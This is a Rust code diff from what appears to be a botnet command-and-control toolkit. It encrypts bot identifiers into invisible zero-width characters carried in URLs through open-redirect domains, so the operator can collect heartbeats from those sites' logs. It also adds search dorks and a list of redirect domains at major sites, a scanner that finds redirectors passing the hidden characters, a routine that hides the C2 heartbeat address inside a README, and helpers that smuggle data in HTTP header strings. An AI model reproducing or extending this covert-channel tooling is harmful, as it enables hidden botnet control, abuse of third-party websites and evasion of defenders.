@@ -1,25 +1,25 @@
 //! ZW-Encoded Heartbeat + Vulnerable Redirect Domain Dorking
 //!
-//! Heartbeat now uses ZW-encoded encrypted payloads:
-//!   bot_id → AEAD encrypt → ZW-encode → embed in redirect URL parameter
+//! Heartbeat uses encrypt-then-ZW-encode via seal_oneshot/open_oneshot:
+//!   bot_id → seal_oneshot(AEAD + ZW) → embed in redirect URL parameter
 //!
 //! Domain dorking finds open-redirect vulnerable domains that
 //! accept and reflect URL parameters containing ZW characters.
 //! These act as relay points — the C2 server scans the vulnerable
 //! domain's logs/analytics to extract bot heartbeats.
 
-use arcticfox_core::crypto::{
-    aead_encrypt, generate_nonce, generate_session_key, SESSION_KEY_LEN, NONCE_LEN,
-};
+use arcticfox_core::crypto::{generate_nonce, SESSION_KEY_LEN, NONCE_LEN};
+#[cfg(test)]
+use arcticfox_core::crypto::{aead_decrypt, generate_session_key};
 use arcticfox_core::zwcodec;
-use arcticfox_zwtransport::ZwSession;
-use tracing::{debug, info, warn};
+use arcticfox_zwtransport::{seal_oneshot, open_oneshot};
+use tracing::{debug, info};
 
 // ── ZW Heartbeat ────────────────────────────────────────────────────────────
 
 /// Generate a ZW-encrypted heartbeat payload for embedding in a URL.
 ///
-/// Format: `?q=<ZW_ENCODED_AEAD_CIPHERTEXT>`
+/// Format: `?q=<seal_oneshot(bot_id)>&n=<nonce_hex>`
 /// The ZW chars are invisible — the URL looks like `?q=` followed by nothing visible.
 pub fn zw_heartbeat_url(
     base_url: &str,
@@ -27,13 +27,11 @@ pub fn zw_heartbeat_url(
     session_key: &[u8; SESSION_KEY_LEN],
 ) -> String {
     let nonce = generate_nonce();
-    let plaintext = bot_id.as_bytes();
-    let ciphertext = aead_encrypt(session_key, &nonce, plaintext)
-        .unwrap_or_else(|_| bot_id.as_bytes().to_vec());
+    let zw_payload = match seal_oneshot(session_key, &nonce, bot_id.as_bytes()) {
+        Ok(zw) => zw,
+        Err(_) => return base_url.to_string(),
+    };
 
-    let zw_payload = zwcodec::encode(&ciphertext);
-
-    // Embed nonce + ZW payload in URL
     let nonce_hex = hex::encode(nonce);
     format!(
         "{}?q={}&n={}",
@@ -56,14 +54,12 @@ pub fn zw_heartbeat_decode(
     let mut nonce = [0u8; NONCE_LEN];
     nonce.copy_from_slice(&nonce_bytes);
 
-    let ciphertext = zwcodec::decode(zw_payload).ok()?;
-    let plaintext = arcticfox_core::crypto::aead_decrypt(session_key, &nonce, &ciphertext).ok()?;
+    let plaintext = open_oneshot(session_key, &nonce, zw_payload).ok()?;
     String::from_utf8(plaintext).ok()
 }
 
 // ── Vulnerable Redirect Domain Dorking ──────────────────────────────────────
 
-/// Known vulnerable redirect patterns that accept arbitrary URL parameters.
 const REDIRECT_DORKS: &[&str] = &[
     "site:google.com inurl:url?q=",
     "site:facebook.com inurl:redirect?url=",
@@ -80,7 +76,6 @@ const REDIRECT_DORKS: &[&str] = &[
     "inurl:redir?url=",
 ];
 
-/// Well-known open redirect domains (user-contributed).
 const KNOWN_REDIRECT_DOMAINS: &[&str] = &[
     "https://www.google.com/url?q=",
     "https://www.facebook.com/flx/warn/?u=",
@@ -94,10 +89,6 @@ const KNOWN_REDIRECT_DOMAINS: &[&str] = &[
     "https://is.gd/",
 ];
 
-/// Test if a domain reflects ZW characters in its redirect response.
-///
-/// Many redirectors strip non-ASCII characters — we need domains that
-/// pass ZW chars through unmodified (typically those using raw HTTP Location headers).
 pub async fn test_zw_reflection(client: &reqwest::Client, base_url: &str) -> bool {
     let test_zw = zwcodec::encode(b"test");
     let test_url = format!("{}{}", base_url, test_zw);
@@ -106,7 +97,6 @@ pub async fn test_zw_reflection(client: &reqwest::Client, base_url: &str) -> boo
         Ok(resp) => {
             let final_url = resp.url().to_string();
             debug!("ZW reflection test: {} → {}", test_url, final_url);
-            // Check if ZW chars made it through to the redirect target
             final_url.contains('\u{200B}') || final_url.contains('\u{200C}')
         }
         Err(e) => {
@@ -116,7 +106,6 @@ pub async fn test_zw_reflection(client: &reqwest::Client, base_url: &str) -> boo
     }
 }
 
-/// Scan a list of domains for ZW-compatible redirects.
 pub async fn scan_zw_redirects(
     client: &reqwest::Client,
     domains: &[String],
@@ -131,12 +120,10 @@ pub async fn scan_zw_redirects(
     compatible
 }
 
-/// Generate dork queries for finding redirect domains via search engines.
 pub fn redirect_dorks() -> Vec<String> {
     REDIRECT_DORKS.iter().map(|d| d.to_string()).collect()
 }
 
-/// Get the built-in list of known redirect domains.
 pub fn known_redirects() -> Vec<String> {
     KNOWN_REDIRECT_DOMAINS.iter().map(|d| d.to_string()).collect()
 }
@@ -144,17 +131,14 @@ pub fn known_redirects() -> Vec<String> {
 // ── ZW Payload in README — Double-Layer ─────────────────────────────────────
 
 /// Embed a ZW-encrypted heartbeat URL inside a README as a hidden relay.
-///
-/// The README contains a ZW-encoded encrypted URL that points to the
-/// heartbeat endpoint. Bots decode this to learn where to phone home.
 pub fn embed_heartbeat_url(readme: &str, hb_url: &str, key: &[u8; SESSION_KEY_LEN]) -> String {
     let nonce = generate_nonce();
-    let ciphertext = aead_encrypt(key, &nonce, hb_url.as_bytes())
-        .unwrap_or_else(|_| hb_url.as_bytes().to_vec());
-    let zw_encoded = zwcodec::encode(&ciphertext);
+    let zw_payload = match seal_oneshot(key, &nonce, hb_url.as_bytes()) {
+        Ok(zw) => zw,
+        Err(_) => return readme.to_string(),
+    };
 
-    // Embed: <nonce_hex>:<zw_encoded> in first heading
-    let payload = format!("{}:{}", hex::encode(nonce), zw_encoded);
+    let payload = format!("{}:{}", hex::encode(nonce), zw_payload);
     zwcodec::inject(readme, payload.as_bytes(), false)
         .unwrap_or_else(|_| readme.to_string())
 }
@@ -172,9 +156,22 @@ pub fn extract_heartbeat_url(readme: &str, key: &[u8; SESSION_KEY_LEN]) -> Optio
     let mut nonce = [0u8; NONCE_LEN];
     nonce.copy_from_slice(&nonce_bytes);
 
-    let ciphertext = zwcodec::decode(zw_part).ok()?;
-    let plaintext = arcticfox_core::crypto::aead_decrypt(key, &nonce, &ciphertext).ok()?;
+    let plaintext = open_oneshot(key, &nonce, zw_part).ok()?;
     String::from_utf8(plaintext).ok()
+}
+
+// ── ZW-Encoded HTTP Header Data ─────────────────────────────────────────────
+
+/// Append ZW-encoded data to a visible string for embedding in HTTP headers.
+/// The visual string is preserved; ZW data is invisible after it.
+pub fn zw_append_hidden(visible: &str, hidden_data: &[u8]) -> String {
+    let encoded = zwcodec::encode(hidden_data);
+    format!("{}{}", visible, encoded)
+}
+
+/// Extract and decode ZW-hidden data from a string that has visible + invisible parts.
+pub fn zw_extract_hidden(combined: &str) -> Option<Vec<u8>> {
+    zwcodec::decode(combined).ok()
 }
 
 // ── Tests ──────────────────────────────────────────────────────────────────
@@ -189,7 +186,6 @@ mod tests {
         let bot_id = "test-bot-ABC123";
         let url = zw_heartbeat_url("https://redirect.example.com/r", bot_id, &key);
 
-        // Extract ZW payload and nonce from URL
         let zw_part = url.split("?q=").nth(1).and_then(|s| s.split("&n=").next()).unwrap();
         let nonce_hex = url.split("&n=").nth(1).unwrap();
 
@@ -204,7 +200,7 @@ mod tests {
         let hb_url = "https://c2.example.com/api/heartbeat/test";
 
         let modified = embed_heartbeat_url(readme, hb_url, &key);
-        assert!(modified.contains("My Project")); // Original content preserved
+        assert!(modified.contains("My Project"));
 
         let extracted = extract_heartbeat_url(&modified, &key).unwrap();
         assert_eq!(extracted, hb_url);
@@ -227,5 +223,13 @@ mod tests {
         let dorks = redirect_dorks();
         assert!(!dorks.is_empty());
         assert!(dorks.iter().any(|d| d.contains("redirect")));
+    }
+
+    #[test]
+    fn zw_hidden_roundtrip() {
+        let data = b"hidden-session-data";
+        let combined = zw_append_hidden("Mozilla/5.0 (X11; Linux x86_64)", data);
+        let extracted = zw_extract_hidden(&combined).unwrap();
+        assert_eq!(extracted, data);
     }
 }
